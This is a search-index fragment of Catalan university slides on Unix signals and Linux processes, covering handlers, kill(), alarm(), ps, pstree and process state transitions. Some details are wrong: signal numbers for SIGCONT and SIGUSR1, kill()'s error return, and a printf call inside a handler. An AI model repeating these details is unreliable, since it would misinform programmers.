    "text": "Gesti√≥ de senyals en C\n#include &lt;signal.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid handler(int sig) {\n    printf(\"Rebut senyal %d\\n\", sig);\n}\n\nint main() {\n    signal(SIGINT, handler);\n    while (1) pause();\n}\n\nAquesta √©s la sintaxis tradicional per incloure la gesti√≥ de senyals en C.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#sigaction",
    "href": "slides/03-signals.html#sigaction",
    "title": "Senyals",
    "section": "sigaction",
    "text": "sigaction\n#include &lt;signal.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid handler(int sig) {\n    write(1, \"SIGINT rebut\\n\", 13);\n}\n\nint main(void) {\n    struct sigaction sa;\n    sa.sa_handler = handler;\n    sigemptyset(&sa.sa_mask);\n    sa.sa_flags = 0;\n\n    sigaction(SIGINT, &sa, NULL);\n\n    while (1) pause();\n}\n\nAquesta √©s m√©s moderna i segura.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#accions-per-defecte",
    "href": "slides/03-signals.html#accions-per-defecte",
    "title": "Senyals",
    "section": "Accions per defecte",
    "text": "Accions per defecte\nCada senyal t√© una acci√≥ per defecte. Algunes possibles accions s√≥n:\n\nIgnorar el senyal (SIG_IGN).\nFinalitzar el proc√©s (abnormal termination).\nFinalitzar el proc√©s i generar un core dump (abnormal termination with core dump).\nAturar el proc√©s (aturar el proc√©s).\nReprendre el proc√©s (continuar el proc√©s).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#senyals-que-no-es-poden-capturar",
    "href": "slides/03-signals.html#senyals-que-no-es-poden-capturar",
    "title": "Senyals",
    "section": "Senyals que no es poden capturar",
    "text": "Senyals que no es poden capturar\nEls senyals SIGKILL i SIGSTOP no poden ser capturats ni ignorats. Per tant, no podreu modificar el comportament per defecte per raons √≤bvies de seguretat. Aix√≤ garanteix que el nucli i l‚Äôusuari sempre puguin aturar o matar un proc√©s mal comportat.\n\nSIGKILL: Finalitza el proc√©s immediatament. kill -SIGKILL pid\nSIGSTOP: Atura el proc√©s immediatament. kill -SIGSTOP pid",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#enviament-de-senyals",
    "href": "slides/03-signals.html#enviament-de-senyals",
    "title": "Senyals",
    "section": "Enviament de senyals",
    "text": "Enviament de senyals\nPer enviar senyals a altres processos s‚Äôutilitza la crida a sistema kill().\n#include &lt;signal.h&gt;\nint kill(pid_t pid, int sig);\nEnvia el senyal sig al/s proc√©s/ssos segons pid:\n\npid &gt; 0 : S‚Äôenvia al proc√©s receptor.\npid = 0 : S‚Äôenvia als processos del mateix grup que l‚Äôemissor.\npid = -1 : S‚Äôenvia a tots els processos als quals el proc√©s t√© perm√≠s per enviar senyals.\npid &lt; -1 : S‚Äôenvia a tots els processos l‚Äôid del grup que coincideixi amb el valor absolut de pid.\n\n\nValors de retorn\n\nEn cas d‚Äô√®xit, s‚Äôha enviat com a m√≠nim un senyal, es retorna zero.\nEn cas d‚Äôerror, retorna SIG_ERR",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#cas-pr√†ctic-problema-t√≠pic",
    "href": "slides/03-signals.html#cas-pr√†ctic-problema-t√≠pic",
    "title": "Senyals",
    "section": "Cas pr√†ctic: Problema t√≠pic",
    "text": "Cas pr√†ctic: Problema t√≠pic\nint main(void) {\n   FILE *f = fopen(\"temp.txt\", \"w\");\n   fprintf(f, \"Hola\\n\");\n   fclose(f);\n   remove(\"temp.txt\");\n}\n\nSi el proc√©s s‚Äôexecuta sense interrupcions, el fitxer temporal temp.txt es crea, s‚Äôescriu ‚ÄúHola‚Äù, es tanca i s‚Äôelimina correctament.\nSi el proc√©s rep un SIGINT (Ctrl+C) abans de tancar el fitxer, el fitxer temporal temp.txt no es tancar√† correctament o no s‚Äôeliminar√†. Aix√≤ pot provocar p√®rdua de dades o corrupci√≥ del fitxer.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#soluci√≥-amb-gesti√≥-de-senyals",
    "href": "slides/03-signals.html#soluci√≥-amb-gesti√≥-de-senyals",
    "title": "Senyals",
    "section": "Soluci√≥ amb gesti√≥ de senyals",
    "text": "Soluci√≥ amb gesti√≥ de senyals\n#include &lt;signal.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nFILE *f;\nvoid cleanup(int sig) {\n    fclose(f);\n    remove(\"temp.txt\");\n    exit(1);\n}\n\nint main(void) {\n    struct sigaction sa = {.sa_handler = cleanup};\n    sigaction(SIGINT, &sa, NULL);\n    f = fopen(\"temp.txt\", \"w\");\n    pause();\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#cas-pr√†ctic-error-t√≠pic",
    "href": "slides/03-signals.html#cas-pr√†ctic-error-t√≠pic",
    "title": "Senyals",
    "section": "Cas pr√†ctic: Error t√≠pic",
    "text": "Cas pr√†ctic: Error t√≠pic\nLes rutines de senyals s‚Äôexecuten de forma as√≠ncrona: √∫nicament han de fer operacions async-signal-safe, √©s a dir, mai es poden cridar funcions com malloc(), printf(), etc.\nvoid handler(int sig) {\n    // ‚ùå Error t√≠pic: malloc() no √©s async-signal-safe\n    char *buf = malloc(100);  \n    write(1, \"SIGINT rebut\\n\", 13);  // ‚úÖ write() √©s segura dins del handler\n    free(buf);\n}\nUna funci√≥ √©s async-signal-safe si no provoca comportament indefinit o corrupci√≥ de mem√≤ria.Nom√©s es poden cridar funcions que no depenguin de recursos globals compartits que puguin estar en un estat inconsistent. En aquest cas, malloc() i free() no s√≥n segures perqu√® poden modificar l‚Äôestat intern del gestor de mem√≤ria, acabant en corrupci√≥ de mem√≤ria heap.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#taula-resum-de-senyals",
    "href": "slides/03-signals.html#taula-resum-de-senyals",
    "title": "Senyals",
    "section": "Taula resum de senyals",
    "text": "Taula resum de senyals\n\n\n\nSenyal\nID\nDescripci√≥\nAcci√≥ per defecte\n\n\n\n\nSIGABRT\n6\nAbort\nTerminaci√≥\n\n\nSIGALRM\n14\nTemporitzador\nTerminaci√≥\n\n\nSIGCONT\n25\nReprendre\nContinuar\n\n\nSIGFPE\n8\nError aritm√®tic\nTerminaci√≥\n\n\nSIGKILL\n9\nFinalitzaci√≥ for√ßada\nNo capturable\n\n\nSIGINT\n2\nInterrupci√≥ usuari (Ctrl+C)\nTerminaci√≥\n\n\nSIGUSR1\n16\nSenyal definit per l‚Äôusuari\nTerminaci√≥",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#timers-al-nucli",
    "href": "slides/03-signals.html#timers-al-nucli",
    "title": "Senyals",
    "section": "Timers al nucli",
    "text": "Timers al nucli\nEl nucli mant√© un repositor de timers (estructures internes, sovint per PCB o grup de processos) que compta el temps restant per a cada proc√©s o alarm.\n\n\n\n\n\n\nsequenceDiagram\n    participant Kernel\n    participant Proc√©s\n\n    Kernel-&gt;&gt;Kernel: Compta temps timers\n    alt Timer expira\n        Kernel-&gt;&gt;Proc√©s: Envia SIGALRM\n    end\n\n\n\n\n\n\n\nQuan expira un timer, el nucli genera un senyal SIGALRM i el posa a la cua de senyals del proc√©s destinatari.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#alarm-i-pcb-process-control-block",
    "href": "slides/03-signals.html#alarm-i-pcb-process-control-block",
    "title": "Senyals",
    "section": "Alarm() i PCB (Process Control Block)",
    "text": "Alarm() i PCB (Process Control Block)\nQuan un proc√©s crida alarm(sec), el kernel:\n\nGuarda el temps restant al PCB del proc√©s (pcb-&gt;alarm_timer).\nPrograma el timer al scheduler o al timer interrupt handler.\nQuan el temps expira, el kernel envia SIGALRM al proc√©s.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#alarm-a-userspace",
    "href": "slides/03-signals.html#alarm-a-userspace",
    "title": "Senyals",
    "section": "alarm() a userspace",
    "text": "alarm() a userspace\nEl proc√©s s‚Äôenvia a si mateix despr√©s de sec segons un senyal SIGALRM. Retorna el nombre de segons pendents si hi havia una crida a alarm anterior, o zero en altre cas.\n#include &lt;unistd.h&gt; C\nunsigned int alarm(unsigned int sec);\n\n\n\n\n\n\n\nDesactivar alarmes\n\n\nPer desactivar una alarma pendent, es pot cridar a alarm(0), aquesta comanda cancel¬∑la qualsevol alarma pendent.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#resum",
    "href": "slides/03-signals.html#resum",
    "title": "Senyals",
    "section": "Resum",
    "text": "Resum",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#aix√≤-√©s-tot-per-avui",
    "href": "slides/03-signals.html#aix√≤-√©s-tot-per-avui",
    "title": "Senyals",
    "section": "Aix√≤ √©s tot per avui",
    "text": "Aix√≤ √©s tot per avui\n\n\nTAKE HOME MESSAGE\n\nEls senyals s√≥n una eina de notificaci√≥ entre el nucli i els processos.\nEls senyals poden ser enviats per l‚Äôusuari, per altres processos o pel mateix proc√©s.\nEls senyals poden ser gestionats pel proc√©s o executar l‚Äôacci√≥ per defecte.\nEls senyals es poden enviar amb la crida a sistema kill().\nEls processos poden definir rutines de tractament de senyals amb la crida a sistema signal().\nEls processos poden esperar senyals amb la crida a sistema",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-procs.html#qu√®-√©s-un-proc√©s",
    "href": "slides/03-procs.html#qu√®-√©s-un-proc√©s",
    "title": "Processos a Linux",
    "section": "Qu√® √©s un proc√©s?",
    "text": "Qu√® √©s un proc√©s?\nUn proc√©s √©s una instancia d‚Äôun programa en execuci√≥ (tasca). Aix√≤ vol dir que si 10 usuaris d‚Äôun servidor utilitzen el mateix programa, com vi, hi ha 10 processos vi que s‚Äôexecuten al servidor, tot i que tots comparteixen el mateix codi executable.\n\nCreaci√≥ i eliminaci√≥.\nGarantir l‚Äôexecuci√≥ i finalitzaci√≥.\nControlar errors i excepcions.\nAssignaci√≥ de recursos.\nComunicaci√≥ i sincronitzaci√≥.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#ps-i",
    "href": "slides/03-procs.html#ps-i",
    "title": "Processos a Linux",
    "section": "ps (I)",
    "text": "ps (I)\nImagineu que utilitzem la comanda sleep 120 &. Aquest comanda ens crear√† 3 processos sleep en background. La eina ps ens permet veure‚Äôls.\n\n\nps -e\nL‚Äôopci√≥ -e indica a l‚Äôordre que mostri tots els processos del sistema. Sense aquesta opci√≥, l‚Äôordre nom√©s mostra els processos de l‚Äôusuari a la sessi√≥ actual.\nAquests processos tenen PID 1053, 1054 i 1054. Tamb√© observeu l‚Äôordre ps al final de la llista. Aix√≤ es deu al fet que l‚Äôordre en si tamb√© √©s un proc√©s.\n\nps -e\n    PID TTY          TIME CMD\n      1 ?        00:00:01 systemd\n      2 ?        00:00:00 kthreadd\n      3 ?        00:00:00 rcu_gp\n      4 ?        00:00:00 rcu_par_gp\n      6 ?        00:00:00 kworker/0:0H-events_highpri\n      9 ?        00:00:00 mm_percpu_wq\n     10 ?        00:00:00 rcu_tasks_rude_\n     11 ?        00:00:00 rcu_tasks_trace\n     12 ?        00:00:00 ksoftirqd/0\n     13 ?        00:00:03 rcu_sched\n     14 ?        00:00:00 migration/0\n     15 ?        00:00:00 cpuhp/0\n     17 ?        00:00:00 kdevtmpfs\n     18 ?        00:00:00 netns\n     ...\n   1053 pts/0    00:00:00 sleep\n   1054 pts/0    00:00:00 sleep\n   1055 pts/0    00:00:00 sleep\n   1056 pts/0    00:00:00 ps",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#ps-ii",
    "href": "slides/03-procs.html#ps-ii",
    "title": "Processos a Linux",
    "section": "ps (II)",
    "text": "ps (II)\n\n\nps -e\n\nLa columna CMD identifica el nom del proc√©s en execuci√≥, com ara sleep.\nLa primera columna indica l‚Äôidentificador de proc√©s (PID) assignat al proc√©s pel sistema operatiu.\nLa segona columna mostra el terminal associat a un proc√©s o ? si el proc√©s no s‚Äôassocia a cap terminal.\nFinalment, la tercera columna mostra el temps de la CPU del proc√©s.\n\n\nps -e\n    PID TTY          TIME CMD\n      1 ?        00:00:01 systemd\n      2 ?        00:00:00 kthreadd\n      3 ?        00:00:00 rcu_gp\n      4 ?        00:00:00 rcu_par_gp\n      6 ?        00:00:00 kworker/0:0H-events_highpri\n      9 ?        00:00:00 mm_percpu_wq\n     10 ?        00:00:00 rcu_tasks_rude_\n     11 ?        00:00:00 rcu_tasks_trace\n     12 ?        00:00:00 ksoftirqd/0\n     13 ?        00:00:03 rcu_sched\n     14 ?        00:00:00 migration/0\n     15 ?        00:00:00 cpuhp/0\n     17 ?        00:00:00 kdevtmpfs\n     18 ?        00:00:00 netns\n     ...\n   1053 pts/0    00:00:00 sleep\n   1054 pts/0    00:00:00 sleep\n   1055 pts/0    00:00:00 sleep\n   1056 pts/0    00:00:00 ps",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#ps-iii",
    "href": "slides/03-procs.html#ps-iii",
    "title": "Processos a Linux",
    "section": "ps (III)",
    "text": "ps (III)\n\n\n\nL‚Äôidentificador de proc√©s (PID) √©s un identificador √∫nic per a un proc√©s.\nEl sistema operatiu utilitza un comptador de 32 bits last_pid per fer un seguiment de l‚Äô√∫ltim PID assignat a un proc√©s.\nQuan es crea un proc√©s, el comptador augmenta i el seu valor es converteix en el PID del nou proc√©s.\nEl kernel ha de comprovar si el valor de last_pid++ ja pertany a una tasca, abans que pugui assignar-lo a un proc√©s nou.\n\n\nps -e\n    PID TTY          TIME CMD\n      1 ?        00:00:01 systemd\n      2 ?        00:00:00 kthreadd\n      3 ?        00:00:00 rcu_gp\n      4 ?        00:00:00 rcu_par_gp\n      6 ?        00:00:00 kworker/0:0H-events_highpri\n      9 ?        00:00:00 mm_percpu_wq\n     10 ?        00:00:00 rcu_tasks_rude_\n     11 ?        00:00:00 rcu_tasks_trace\n     12 ?        00:00:00 ksoftirqd/0\n     13 ?        00:00:03 rcu_sched\n     14 ?        00:00:00 migration/0\n     15 ?        00:00:00 cpuhp/0\n     17 ?        00:00:00 kdevtmpfs\n     18 ?        00:00:00 netns\n     ...\n   1053 pts/0    00:00:00 sleep\n   1054 pts/0    00:00:00 sleep\n   1055 pts/0    00:00:00 sleep\n   1056 pts/0    00:00:00 ps",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#top",
    "href": "slides/03-procs.html#top",
    "title": "Processos a Linux",
    "section": "top",
    "text": "top",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#estats-dels-processos",
    "href": "slides/03-procs.html#estats-dels-processos",
    "title": "Processos a Linux",
    "section": "Estats dels processos",
    "text": "Estats dels processos\n\n\n\nNou: Proc√©s que encara no est√† creat del tot, li falta el PCB.\nInactiu: Quan un proc√©s ha finalitzat.\nPreparat: Quan un proc√©s t√© assignats tots els recursos necessaris per poder executar-se (excepte la CPU).\nExecuci√≥: Quan un proc√©s t√© assignada la CPU.\nEspera: Quan al proc√©s li falta algun recurs per poder executar-se.\n\n\n\n\n\nPer veure informaci√≥ dels processos en UNIX tornarem a fer servir la comanda ps. Si fem man ps i busquem PROCESS STATE CODES, veurem el seg√ºents estats:\n\n\nD uninterruptible sleep (usually IO)\nI Idle kernel thread\nR running or runnable (on run queue)\nS interruptible sleep (waiting for an event to complete)\nT stopped by job control signal\nt stopped by debugger during the tracing\nW paging (not valid since the 2.6.xx kernel)\nX dead (should never be seen)\nZ defunct (‚Äúzombie‚Äù) process, terminated but not reaped by its parent",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#ps-iv",
    "href": "slides/03-procs.html#ps-iv",
    "title": "Processos a Linux",
    "section": "ps (IV)",
    "text": "ps (IV)\nEs pot mostrar m√©s informaci√≥ sobre la llista de processos mitjan√ßant l‚Äôopci√≥ -l de l‚Äôordre ps:\nps -l\nF S   UID     PID    PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD\n4 S     0    1034    1007  0  80   0 -  2095 -      pts/0    00:00:00 bash\n0 T     0    1059    1034  0  80   0 -  3448 -      pts/0    00:00:00 vi\n0 S     0    1064    1034  0  80   0 -  1326 -      pts/0    00:00:00 sleep\n4 R     0    1065    1034  0  80   0 -  2405 -      pts/0    00:00:00 ps\n\nLa primera columna (F) de la sortida anterior identifica els indicadors de proc√©s (vegeu la p√†gina del manual si esteu interessats). La columna (S) indica l‚Äôestat d‚Äôun proc√©s.\nRecordeu que sense l‚Äôopci√≥ -e, ps nom√©s mostra els processos al terminal actual, en aquest cas pts/0.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#arbre-de-processos",
    "href": "slides/03-procs.html#arbre-de-processos",
    "title": "Processos a Linux",
    "section": "Arbre de processos",
    "text": "Arbre de processos\n\nEstructura jer√†rquica dels processos en formada d‚Äôarbre.\nTots els processos tenen un proc√©s pare, excepte el proc√©s inicial (PID = 1).\nEls processos poden tenir zero o m√©s processos fills.\nEls atributs PID i PPID identifiquen el proc√©s i el seu pare.\n\n\nEn l‚Äôexemple anterior, podeu veure que el proc√©s bash √©s el pare dels processos sleep i ps. Si esteu connectats per ssh al servidor, el proc√©s bash √©s fill del proc√©s sshd. I el proc√©s sshd √©s fill del proc√©s init (PID = 1).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#qui-√©s-el-pare-de-pid1",
    "href": "slides/03-procs.html#qui-√©s-el-pare-de-pid1",
    "title": "Processos a Linux",
    "section": "Qui √©s el pare de PID=1?",
    "text": "Qui √©s el pare de PID=1?\nEl proc√©s amb PID = 1 √©s el primer proc√©s que s‚Äôinicia quan el sistema arrenca. Aquest proc√©s es coneix com a init (o systemd en sistemes m√©s moderns) i √©s el pare de tots els altres processos en execuci√≥ al sistema.\n\nAquest proc√©s el crea el kernel durant el proc√©s d‚Äôarrencada del sistema operatiu.\nEl kernel √©s responsable de carregar i iniciar el sistema operatiu.\nAquest √©s l‚Äô√∫nic proc√©s que no t√© un proc√©s pare, ja que √©s el primer proc√©s que s‚Äôinicia en el sistema.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#qu√®-√©s-un-proc√©s-inactiu",
    "href": "slides/03-procs.html#qu√®-√©s-un-proc√©s-inactiu",
    "title": "Processos a Linux",
    "section": "Qu√® √©s un proc√©s inactiu?",
    "text": "Qu√® √©s un proc√©s inactiu?\nUn proc√©s inactiu √©s un proc√©s que esta esperant a que succeeixi un esdeveniment per poder continuar la seva execuci√≥.\nAquest esdeveniment pot ser una entrada de l‚Äôusuari, la finalitzaci√≥ d‚Äôuna operaci√≥ d‚Äôentrada/sortida, o qualsevol altra condici√≥ que el proc√©s necessita per continuar.\nLa majoria dels processos del sistema s√≥n inactius, que esperen algun tipus d‚Äôesdeveniment, com ara fer clic amb el ratol√≠ o pr√©mer una tecla. A l‚Äôexemple anterior, l‚Äô√∫nica ordre en execuci√≥ √©s ps.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#pstree",
    "href": "slides/03-procs.html#pstree",
    "title": "Processos a Linux",
    "section": "pstree",
    "text": "pstree\n\n\nps -l\nF S   UID     PID    PPID  C PRI  NI ADDR SZ WCHAN  TTY      CMD\n4 S     0    1034    1007  0  80   0 -  2095 -      pts/0    bash\n0 T     0    1059    1034  0  80   0 -  3448 -      pts/0    vi\n0 T     0    1066    1034  0  80   0 -  3448 -      pts/0    vim\n0 T     0    1068    1034  0  80   0 -  2358 -      pts/0    top\n0 T     0    3502    1034  0  80   0 - 30692 -      pts/0    emacs\n0 T     0    3505    1034  0  80   0 - 30692 -      pts/0    emacs\n4 R     0    3569    1034  0  80   0 -  2405 -      pts/0    ps\n\nsu root -c \"apt-get install psmisc -y\"\n\npstree\nsystemd-|-agetty\n        |--cron\n        |--dbus-daemon\n        |--dhclient---3*[{dhclient}]\n        |--exim4\n        |--rsyslogd---3*[{rsyslogd}]\n        |--sshd-|-sshd---bash-|-2*[emacs---{emacs}]\n        |       |             |--pstree\n        |       |             |--top\n        |       |             |--vi\n        |       |             |--vim\n        |       |--sshd---bash---emacs---{emacs}\n        |--systemd---(sd-pam)\n        |--systemd-journal\n        |--systemd-logind\n        |--systemd-timesyn---{systemd-timesyn}\n        |--systemd-udevd\n        |--wpa_supplicant",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#diagrama-de-transici√≥-destats-i",
    "href": "slides/03-procs.html#diagrama-de-transici√≥-destats-i",
    "title": "Processos a Linux",
    "section": "Diagrama de transici√≥ d‚Äôestats (I)",
    "text": "Diagrama de transici√≥ d‚Äôestats (I)\nEl temps de vida d‚Äôun proc√©s X pot ser dividit en un conjunt d‚Äôestats que descriuen el comportament de l‚Äôproc√©s.\n\nExecutant-se en mode usuari.\nExecutant-se en mode nucli o supervisor.\nPreparat en mem√≤ria principal per a ser executat. El proc√©s no est√† executant, per√≤ est√† carregat en mem√≤ria principal. A punt per ser executat quan el planificador de processos ho decideixi.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#diagrama-de-transici√≥-destats-ii",
    "href": "slides/03-procs.html#diagrama-de-transici√≥-destats-ii",
    "title": "Processos a Linux",
    "section": "Diagrama de transici√≥ d‚Äôestats (II)",
    "text": "Diagrama de transici√≥ d‚Äôestats (II)\n\nDormit o bloquejat en mem√≤ria principal. El proc√©s es troba esperant en mem√≤ria principal a qu√® es produeixi un determinat esdeveniment, com per exemple, la finalitzaci√≥ d‚Äôuna operaci√≥ d‚ÄôE/S.\nPreparat en mem√≤ria secund√†ria per a ser executat. El proc√©s esta preparat per a ser executat, per√≤ est√† intercanviat a mem√≤ria secund√†ria (disc).\nDormit o bloquejat en mem√≤ria secund√†ria. El proc√©s est√† esperant en mem√≤ria secund√†ria a qu√® es produeixi un determinat esdeveniment.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#diagrama-de-transici√≥-destats-iii",
    "href": "slides/03-procs.html#diagrama-de-transici√≥-destats-iii",
    "title": "Processos a Linux",
    "section": "Diagrama de transici√≥ d‚Äôestats (III)",
    "text": "Diagrama de transici√≥ d‚Äôestats (III)\n\nCreat. El proc√©s s‚Äôha creat recentment i est√† en un estat de transici√≥. El proc√©s existeix, per√≤ no es troba preparat per ser executat ni tampoc est√† adormit. Aquest estat √©s l‚Äôinicial per a tots els processos.\nZombi. Aquest √©s l‚Äôestat final d‚Äôun proc√©s. S‚Äôarriba mitjan√ßant l‚Äôexecuci√≥ expl√≠citament o impl√≠cita de la crida a sistema exit.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#diagrama-de-transici√≥-destats-iv",
    "href": "slides/03-procs.html#diagrama-de-transici√≥-destats-iv",
    "title": "Processos a Linux",
    "section": "Diagrama de transici√≥ d‚Äôestats (IV)",
    "text": "Diagrama de transici√≥ d‚Äôestats (IV)\n\nExpropiat. Quan un proc√©s (A) executant-se en mode usuari ha finalitzat el seu temps:\n\nEl SO envia una interrupci√≥ del rellotge de sistema.\nEl tractament d‚Äôaquesta interrupci√≥ s‚Äôha de fer en mode kernel.\nS‚Äôexpropia el proc√©s A i un cop en mode kernel el planificador de processos pot decidir quin √©s el seg√ºent proc√©s que s‚Äôexecutar√†.\n\n\n\nL‚Äôestat expropiat es similar a l‚Äôestat preparat en mem√≤ria principal per ser executat, per√≤ un proc√©s expropiat t√© garantit que el seu pr√≤xim estat ser√† execuci√≥ en mode usuari quan torni a ser planificat per ser executat",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#diagrama-de-transici√≥-destats-v",
    "href": "slides/03-procs.html#diagrama-de-transici√≥-destats-v",
    "title": "Processos a Linux",
    "section": "Diagrama de transici√≥ d‚Äôestats (V)",
    "text": "Diagrama de transici√≥ d‚Äôestats (V)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#transicions-destat-creaci√≥-i-execuci√≥-dun-proc√©s",
    "href": "slides/03-procs.html#transicions-destat-creaci√≥-i-execuci√≥-dun-proc√©s",
    "title": "Processos a Linux",
    "section": "Transicions d‚Äôestat: Creaci√≥ i execuci√≥ d‚Äôun proc√©s",
    "text": "Transicions d‚Äôestat: Creaci√≥ i execuci√≥ d‚Äôun proc√©s\nQuan un nou proc√©s (A) es crea, mitjan√ßant una crida a sistema fork realitzada per un altre proc√©s (B), el primer estat en qu√® entra A √©s l‚Äôestat creat. Des d‚Äôaqu√≠ pot passar, depenent de si hi ha prou espai en mem√≤ria principal: a) preparat per a execuci√≥ en mem√≤ria principal o b) preparat per a execuci√≥ en mem√≤ria secund√†ria.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#transicions-destat-crida-a-sistema",
    "href": "slides/03-procs.html#transicions-destat-crida-a-sistema",
    "title": "Processos a Linux",
    "section": "Transicions d‚Äôestat: Crida a sistema",
    "text": "Transicions d‚Äôestat: Crida a sistema\n\nUn proc√©s A invoca en mode usuari una crida a sistema, per exemple read(), per llegir dades d‚Äôun fitxer. En aquest moment el proc√©s A passa a l‚Äôestat execuci√≥ en mode nucli on s‚Äôexecuta la crida a sistema.\nread() necessita realitzar una operaci√≥ d‚ÄôE/S amb el disc, llavors el kernel ha d‚Äôesperar que es completi l‚Äôoperaci√≥.\nEl proc√©s A passa a l‚Äôestat adormit en mem√≤ria principal.\nQuan es completa l‚Äôoperaci√≥ d‚ÄôE/S, el maquinari interromp a la CPU i el manipulador de la interrupci√≥ despertar√† el proc√©s, la qual cosa provocar√† que passi a l‚Äôestat preparat per a execuci√≥ en mem√≤ria.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#transicions-destat-execuci√≥-en-mem√≤ria-secund√†ria",
    "href": "slides/03-procs.html#transicions-destat-execuci√≥-en-mem√≤ria-secund√†ria",
    "title": "Processos a Linux",
    "section": "Transicions d‚Äôestat: Execuci√≥ en mem√≤ria secund√†ria",
    "text": "Transicions d‚Äôestat: Execuci√≥ en mem√≤ria secund√†ria\n\nSuposem que en el sistema s‚Äôestan executant molts processos i que no hi ha prou espai en mem√≤ria.\nEl SO tria per ser intercanviats a mem√≤ria secund√†ria a alguns processos que es troben en l‚Äôestat preparat per a execuci√≥ en mem√≤ria principal o en l‚Äôestat expropiat.\nAquests processos passaran a l‚Äôestat preparat per a execuci√≥ en mem√≤ria secund√†ria.\nPer tornar a tenir possibilitat d‚Äôexecutar-se, aquests processos hauran de ser intercanviats de nou a mem√≤ria principal.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#transicions-destat-retorn-a-mem√≤ria-principal",
    "href": "slides/03-procs.html#transicions-destat-retorn-a-mem√≤ria-principal",
    "title": "Processos a Linux",
    "section": "Transicions d‚Äôestat: Retorn a mem√≤ria principal",
    "text": "Transicions d‚Äôestat: Retorn a mem√≤ria principal\n\nEn un moment donat, l‚Äôintercanviador tria el proc√©s m√©s apropiat per intercanviar a la mem√≤ria principal.\nAquest passa a l‚Äôestat preparat per a execuci√≥ en mem√≤ria.\nEl planificador en algun instant triar√† el proc√©s per executar-se i llavors passar√† a l‚Äôestat execuci√≥.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#transicions-destat-finalitzant-el-proc√©s",
    "href": "slides/03-procs.html#transicions-destat-finalitzant-el-proc√©s",
    "title": "Processos a Linux",
    "section": "Transicions d‚Äôestat: Finalitzant el proc√©s",
